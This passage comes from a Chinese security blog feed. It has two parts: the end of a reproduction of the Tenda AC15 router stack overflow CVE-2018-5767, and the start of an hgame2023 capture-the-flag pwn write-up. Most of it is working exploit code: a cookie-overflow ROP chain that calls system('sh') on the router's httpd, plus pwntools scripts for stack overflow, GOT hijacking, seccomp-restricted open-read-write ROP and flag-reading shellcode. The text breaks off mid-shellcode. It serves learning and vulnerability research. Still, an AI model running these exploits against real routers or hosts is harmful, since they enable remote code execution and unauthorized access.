cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>但我们没有按预期返回，而是被某子函数干扰了，<code>gdb</code>中利用<code>bt</code>命令溯源一下：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/112590/12/35271/139746/63cbdf3cF15f3db66/09273cb75e2df912.png" style="zoom:80%;" /><ul><li>在<code>ida</code>中找到干扰函数所在位置，我们要想办法防止程序执行流走到该分支：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/174764/17/33384/125374/63cbe09cFc920f42f/bb10de241747a44f.png" style="zoom:80%;" /><ul><li>修改<code>payload</code>，使<code>password</code>加上<code>.gif</code>即可直接返回，如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x400</span>+<span class="string">&quot;.gif&quot;</span>&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>重复上述流程，程序执行流来到我们发生的垃圾数据，我们注意到地址是<code>0x61616160</code>而非<code>0x61616161</code>，这是因为<code>arm</code>模式与<code>thumb</code>模式的切换问题。在函数退出时执行了<code>pop pc</code>的操作，而其最低有效位(LSB)将会被写入到<code>CPSR寄存器</code>(当前程序状态寄存器)的T位中：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/52601/34/22749/86724/63cbe317F2b18c959/149ae61d7acf6b6d.png" style="zoom:80%;" /><ul><li>在构造<code>ROP</code>链之前，首先我们需要明白<code>32位arm</code>架构是如何进行系统调用的：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/97649/20/35562/153499/63cbe7d8Ff346c9f7/2d26131e222dfd7a.png" style="zoom:80%;" /><ul><li>本质和<code>x86/x64</code>大差不差，用<code>ROPgagdet</code>找到需要的<code>gadget</code>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root/bin$ ROPgadget --binary httpd --only <span class="string">&quot;pop&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000ec88 : pop &#123;fp, pc&#125;</span><br><span class="line">0x000b06bc : pop &#123;r0, pc&#125;</span><br><span class="line">0x000b0e0c : pop &#123;r1, pc&#125;</span><br><span class="line">0x0000e510 : pop &#123;r3, pc&#125;</span><br><span class="line">0x0000e5f0 : pop &#123;r3, r4, fp, pc&#125;</span><br><span class="line">0x0009ffb4 : pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">0x000a0320 : pop &#123;r3, r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x000a5e30 : pop &#123;r3, r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x0000ec00 : pop &#123;r4, fp, pc&#125;</span><br><span class="line">0x0009fd10 : pop &#123;r4, pc&#125;</span><br><span class="line">0x0000ed80 : pop &#123;r4, r5, fp, pc&#125;</span><br><span class="line">0x000ae530 : pop &#123;r4, r5, pc&#125;</span><br><span class="line">0x000281f4 : pop &#123;r4, r5, r6, fp, pc&#125;</span><br><span class="line">0x0009fde4 : pop &#123;r4, r5, r6, pc&#125;</span><br><span class="line">0x0001bff0 : pop &#123;r4, r5, r6, r7, fp, pc&#125;</span><br><span class="line">0x000a07c4 : pop &#123;r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x0004aec4 : pop &#123;r4, r5, r6, r7, r8, fp, pc&#125;</span><br><span class="line">0x000a002c : pop &#123;r4, r5, r6, r7, r8, pc&#125;</span><br><span class="line">0x0003cfe8 : pop &#123;r4, r5, r6, r7, r8, sb, fp, pc&#125;</span><br><span class="line">0x00090408 : pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span><br><span class="line">0x000a1e78 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class="line">0x000a5128 : pop &#123;r4, r5, r6, r7, r8, sl, fp, pc&#125;</span><br><span class="line">0x0009fe44 : pop &#123;r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x0007036c : pop &#123;r4, r6, r7, fp, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 24</span><br></pre></td></tr></table></figure><p>第一次还看不懂，想着<code>ret</code>在哪里，忽然发现<code>pop pc</code>就是<code>ret</code>。</p><ul><li>计算偏移为<code>448</code>，构造执行<code>puts(&quot;ANZA_HACK&quot;)</code>的<code>rop</code>链发现失败，不难猜测原因是<code>sscanf</code>被<code>\x00</code>截断了(因为用的源程序的<code>gadget</code>，高位为<code>\x00</code>)，故采用<code>libc</code>的<code>gagdet</code>，首先要计算本地<code>libc</code>基址，根据之前在<code>strstr</code>处出错的图可得：</li></ul><p><code>注：与 ctf 中不同的一点是这种 web 服务在崩溃后一般会立刻重启，并且重启之后的 libc 地址和之前是相同的，所以爆破 libc 是比较常用的攻击手段，不过 qemu 没办法提供这种爆破 libc 的条件，我们先假定我们知道 libc 基址。</code></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/112590/12/35271/139746/63cbdf3cF15f3db66/09273cb75e2df912.png" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base=<span class="number">0xff613954</span>-<span class="number">24</span>-libc.sym[<span class="string">&quot;strstr&quot;</span>]</span><br></pre></td></tr></table></figure><ul><li>最终<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc=ELF(<span class="string">&quot;./lib/libc.so.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0xff613954</span>-<span class="number">24</span>-libc.sym[<span class="string">&quot;strstr&quot;</span>]</span><br><span class="line">pop_r0_ret=libc_base+<span class="number">0x0003db80</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sh_addr=<span class="number">0xfffeeca8</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">444</span>+<span class="string">&quot;.gif&quot;</span>+p32(pop_r0_ret).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+p32(sh_addr).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+p32(system).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">payload+=<span class="string">&quot;sh\x00\x00&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+payload&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>其他博客的结果都不能<code>getshell</code>。。。。我反而可以<code>getshell</code>，效果如下：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/222104/25/16882/304730/63cc009fFb1cef77d/1cf45750308aabda.png" style="zoom:80%;" /><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>很有意思的一次实验，接触了很多以前只是听过但是未投入实践的知识，算是入门漏洞挖掘的第一步吧，当然还有很多细节没有盘清楚，未来还需努力。再次感谢博客师傅们。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;考研期间想复现的漏洞，现在挖出来盘一下。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/GDPpK1Pew6bkUZUfazur9Q&quot;&gt;Tenda-AC15栈溢出漏洞(CVE-2018-5767)    by 星期五实验室&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/468018356&quot;&gt;cve-2018-5767 路由器栈溢出漏洞复现    by 合天网安实验室&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wzt.ac.cn/2019/03/19/CVE-2018-5767/&quot;&gt;CVE-2018-5767 复现分析    by CataLpa&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="cve" scheme="http://example.com/categories/cve/"/>
    
    <category term="cve-2018-5767" scheme="http://example.com/categories/cve/cve-2018-5767/"/>
    
    
    <category term="cve tenda" scheme="http://example.com/tags/cve-tenda/"/>
    
  </entry>
  
  <entry>
    <title>hgame2023</title>
    <link href="http://example.com/2023/01/05/hgame2023/"/>
    <id>http://example.com/2023/01/05/hgame2023/</id>
    <published>2023-01-05T12:06:14.000Z</published>
    <updated>2023-02-01T14:02:32.950Z</updated>
    
    <content type="html"><![CDATA[<p>复健。</p><span id="more"></span><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>确实<code>easy</code>，直接构造栈溢出即可，要注意后门函数地址+1。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/159776/24/33843/7163/63b6c784F98142c24/0da58b7fb1d9c047.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/25967/13/20268/3396/63b6c784Fb27b4e3c/ad354f6b6cdab194.png" style="zoom:80%;" /><p><code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">backdoor=<span class="number">0x40117b</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor)*<span class="number">10</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>得到<code>shell</code>后进行一波重定位即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>典型的负整数越界利用，由未检查下界导致。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/128060/20/29852/46558/63b6d8d4Faffade79/9f8aae62c7a0994e.png" style="zoom:80%;" /><ul><li>漏洞允许我们更改下标指向<code>0x10</code>内容，且程序可劫持<code>got</code>表。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><ul><li>第一步，劫持<code>exit</code>为<code>vuln</code>函数。</li><li>第二步，泄露任意一处<code>got</code>表地址，即泄露<code>libc</code>。</li><li>第三步，劫持<code>puts</code>为<code>system</code>，顺便写入<code>/bin/sh</code>。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/59060/18/22803/30759/63b6da2eF20602c20/59d8c4d007e52f4e.png" style="zoom:80%;" /><ul><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">32413</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">vul=<span class="number">0x4011DA</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,p64(vul))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-8&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setbuf=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=setbuf-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-9&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>蛮有意思的一道<code>orw</code>题，巩固了一些知识点。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/140425/14/33061/4893/63b83266F5ad1d4fd/c999c86fdd690970.png" style="zoom:80%;" /><p>简单的栈溢出，开了沙箱，禁了<code>system</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004</span><br><span class="line"> 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><ul><li>首先泄露<code>libc</code>。</li><li>由于溢出的并不多，因此得想办法<strong>增强溢出能力</strong>。一开始想着走一步返回一步，但溢出的数量仍不足以一次性完成如<code>read(3,bss,0x30)</code>这一系列操作。该题比较巧妙的一点是由于是<code>read</code>造成的溢出，我们其实无需控制<code>rdi</code>和<code>rsi</code>，只需增大<code>rdx</code>，并再次调用<code>read</code>即可。</li><li>ps. 看了下官方<code>wp</code>使用的是<code>栈迁移</code>和<code>mprotect</code>，感觉不如本方法简单。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31611</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">vul=<span class="number">0x4012C4</span></span><br><span class="line">flag_addr=<span class="number">0x404080</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401393</span></span><br><span class="line">pop_rsi_r13_ret=<span class="number">0x0000000000401391</span></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404020</span>)+p64(elf.sym[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">payload+=p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">openn=libc_base+<span class="number">0x10DCE0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rsi_r13_ret)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])+p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">299</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rdx_ret)+p64(<span class="number">0x300</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">264</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_r13_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(openn)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_r13_ret)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x40</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(libc_base+<span class="number">0x10E060</span>)+p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>还需注意的点是：</p><ol><li><code>open</code>和<code>open64</code>是一个东西，当时<code>libc</code>里找半天，发现<code>open64</code>里有这么一句注释：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Alternative name is &#x27;__open&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用<code>remote</code>远程端口时，<code>read</code>的<code>rdx</code>参数有多大传多少，否则会导致下面<code>send</code>的数据被之前的<code>read</code>吃掉。</li></ol><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><p>这种<code>shellcode</code>题目除了掌握基本的<code>orw_shellcode</code>外，要时刻关注执行<code>shellcode</code>前后的寄存器变化，根据寄存器写<code>shellcode</code>。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/218678/6/25270/21739/63b83fb5Fc42dc228/e207fa91b6c24ab5.png" style="zoom:80%;" /><ul><li>首先<code>shellcode</code>有<code>16</code>个字节大小的限制，这也就意味着接下来我们要用<code>16</code>个字节大小限制的<code>shellcode</code>扩大漏洞利用能力。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/157748/33/33698/56517/63b8408eFc10e2b83/c51017ea28f05343.png" style="zoom:80%;" /><ul><li>调试并根据寄存器编写一下<code>shellcode</code>，目标是写入更多数据到<code>0xcafe0000</code>这片空间并执行：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br></pre></td></tr></table></figure><ul><li>而后就是编写常规的<code>orw</code>的<code>shellcode</code>，注意开头需要多写一些<code>nop</code>，否则写出的就不是目标<code>flag</code>，猜测是控制相关问题：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>总的<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31266</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    